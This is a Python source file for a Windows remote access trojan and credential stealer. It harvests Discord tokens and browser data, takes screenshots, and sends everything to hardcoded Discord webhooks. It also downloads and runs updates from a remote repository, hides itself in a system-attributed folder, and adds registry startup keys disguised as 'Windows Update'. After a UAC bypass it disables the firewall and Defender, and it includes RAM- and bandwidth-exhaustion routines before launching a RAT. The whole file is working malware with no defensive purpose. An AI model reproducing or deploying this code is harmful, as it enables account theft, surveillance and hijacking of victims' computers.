import os
import requests
import subprocess
import time
import threading
import winreg
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from sys import argv
import asyncio
from Crypto.Cipher import AES
import httpx
import json
import socket
import shutil
import tempfile
import sys
import discord
import discordc
import re
import win32con
import ctypes
import webbrowser
from json import loads as json_loads
from discord.ext import commands
import psutil
from sysinf import send_device_information   
from config import Config
from _webhook import _WebhookX
from PIL import ImageGrab
from dhooks import Embed
from dhooks import File
from datetime import datetime
from win32crypt import CryptUnprotectData
from _random_string import get_random_string
from browser import Browsers
from uacbypass import GetSelf, IsAdmin, UACbypass
import drat
import logging


""""
except Exception as e:
    print(e)
    import time
    import os
    import sys
    input("Found missing modules. Press enter to install them.")
    print("Installing missing modules in 3 seconds. CTRL + C to cancel.")
    time.sleep(3.0)
    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install discord")
    os.system("cls")
    print("Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds.")
    time.sleep(10)
    sys.exit

"""    

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
CONTROL_SERVER = "https://api.zitemaker.epicgamer.org"
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
COMMAND_PREFIX = "!"
intents = discord.Intents.default()
intents.message_content = True

connected_clients = {}
ram_eater_active = False
bandwidth_eater_active = False
running_commands = []
cc = Config()
main_path = os.path.join(os.getenv("APPDATA"), 'republicofwadiya')
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()
webhook = cc.get_webhook()
vault_webhook = "https://discord.com/api/webhooks/1338044732798140438/mvVteBvkzzA2sU4cHo9N7iIibTwmji_4ixi4gL-ic_TkUzMBO2q-5877SDcz89d4wM-_"
Threadlist = []
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
roaming = os.getenv("APPDATA")
hostname = socket.gethostname()
HIDDEN_DIR = "C:\\ProgramData\\System32Backup"

if not os.path.exists(main_path):
    try:
        os.mkdir(main_path)
    except Exception as e:
        print(e)

def send_error_notification(exception, type):
    webx = _WebhookX().get_object()

    embed = Embed(
        title='WIA Report',
        description='Citadel Instance - Error',
        color=eb_color,
        timestamp=datetime.now().isoformat()
    )

    embed.set_author(name=wh_name, icon_url=wh_avatar)
    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
    embed.add_field(name=f"Error in {type} occured | Fcuk pogy", value=f'`{exception}`', inline=False)

    webx.send(embed=embed)

def debug(message):
    print(f"[DEBUG] {message}")




def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")        


#check_for_updates()


# ram eater
def eat_ram():
    global ram_eater_active
    debug("Starting RAM consumption...")
    try:
        x = []
        while ram_eater_active:
            x.append(bytearray(100000000))
            time.sleep(0.5)
    except MemoryError:
        debug("RAM consumption stopped due to memory error.")
    except Exception as e:
        debug(f"Error in eat_ram: {e}")
    finally:
        ram_eater_active = False


# internet eater
def eat_bandwidth():
    global bandwidth_eater_active
    debug("Starting bandwidth consumption...")
    while bandwidth_eater_active:
        try:
            requests.get("http://speedtest.tele2.net/10GB.zip")
        except Exception as e:
            debug(f"Error in eat_bandwidth: {e}")
        time.sleep(1)

def enable_privileges():
    try:
        ctypes.windll.advapi32.OpenProcessToken.restype = ctypes.c_long
        TOKEN_ADJUST_PRIVILEGES = 0x20
        TOKEN_QUERY = 0x8
        SE_PRIVILEGE_ENABLED = 0x2

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", ctypes.c_longlong), ("Attributes", ctypes.c_ulong)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES)]

        hToken = ctypes.c_void_p()
        luid = ctypes.c_longlong()
        ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken))
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeTakeOwnershipPrivilege", ctypes.byref(luid))

        tp = TOKEN_PRIVILEGES(PrivilegeCount=1, Privileges=LUID_AND_ATTRIBUTES(Luid=luid.value, Attributes=SE_PRIVILEGE_ENABLED))
        ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)

        print("[INFO] Privileges escalated successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to enable privileges: {e}")

def take_ownership(file_path):
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c takeown /f \"{file_path}\" && icacls \"{file_path}\" /grant administrators:F", None, 1)
    except Exception as e:
        print(f"[ERROR] Failed to take ownership: {e}")


def is_running(process_name):
    """Check if a process is already running."""
    for proc in psutil.process_iter(attrs=['cmdline']):
        try:
            if proc.info['cmdline'] and process_name in " ".join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

def move_to_hidden_directory():
    if not os.path.abspath(__file__).startswith(HIDDEN_DIR):
        print(f"[INFO] Moving script to hidden directory: {HIDDEN_DIR}")
        os.makedirs(HIDDEN_DIR, exist_ok=True)

        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        for filename in os.listdir(script_dir):
            if filename.endswith(".py") or filename == "crack.dll":
                source_path = os.path.join(script_dir, filename)
                dest_path = os.path.join(HIDDEN_DIR, filename)
                
                if os.path.isfile(dest_path):
                    os.remove(dest_path)
                
                shutil.copy2(source_path, dest_path)
                print(f"[INFO] Copied {filename} to hidden directory (Overwritten).")


        subprocess.run(["attrib", "+H", "+S", HIDDEN_DIR], shell=True)


        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))

        print("[INFO] Restarting from hidden directory...")
        subprocess.Popen([pythonw_path, hidden_script_path], creationflags=subprocess.DETACHED_PROCESS)
        sys.exit()

def add_to_startup():
    """Add the script to startup registry keys."""
    try:
        print("[INFO] Adding to startup registry...")

        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))
        system32_path = os.path.join(HIDDEN_DIR, "system32.py")

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{pythonw_path}" "{hidden_script_path}"')
            winreg.SetValueEx(registry_key, "System32", 0, winreg.REG_SZ, f'"{pythonw_path}" "{system32_path}"')

        print("[SUCCESS] Registry keys updated successfully.")

    except Exception as e:
        print(f"[ERROR] Failed to add to startup: {e}")

def ensure_watchdog():
    """Ensure `system32.py` is always running."""
    watchdog_script = os.path.join(HIDDEN_DIR, "system32.py")

    if not is_running("system32.py"):
        print("[!] Watchdog is not running. Starting it now...")
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, watchdog_script], creationflags=subprocess.DETACHED_PROCESS)

try:
    if not IsAdmin():
        if GetSelf()[1]:
            if UACbypass():
                subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
                subprocess.run(r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
except Exception as e:
    send_error_notification(e, 'Wadiyan UAC Bypass')        





if cc.get_screenshot():
    try:
        rndm_strr = get_random_string(5)
        path = os.path.join(main_path, f"screenshot_{rndm_strr}.png")
        screenshot = ImageGrab.grab()        
        screenshot.save(path)
        
        webx = _WebhookX().get_object()

        embed = Embed(
            title='WIA Report',
            description='Citadel Instance - Screenshot',
            color=eb_color,
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=wh_name, icon_url=wh_avatar)
        embed.set_footer(text=eb_footer, icon_url=wh_avatar)

        file = File(path, name='screenshot.png')

        embed.set_image(url=f"attachment://screenshot.png")
        
        webx.send(embed=embed, file=file)
        
        os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Wadiyan Screenshot Stealer')


if cc.get_browser_stealing():
    try:
        browsers = Browsers(vault_webhook)
    except Exception as e:
        send_error_notification(e, 'Wadiyan Browser Stealer')    


#enable_privileges()
#take_ownership(HIDDEN_DIR)
#move_to_hidden_directory()
ensure_watchdog()
add_to_startup()
send_device_information()
drat.run_rat()


"""
async def main():
    debug("Starting main function...")
    
    add_to_startup()
    #run_in_background()
    loop.create_task(start_bot())
    loop.create_task(send_device_information())

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    loop.run_until_complete(main())
    loop.run_forever()

"""
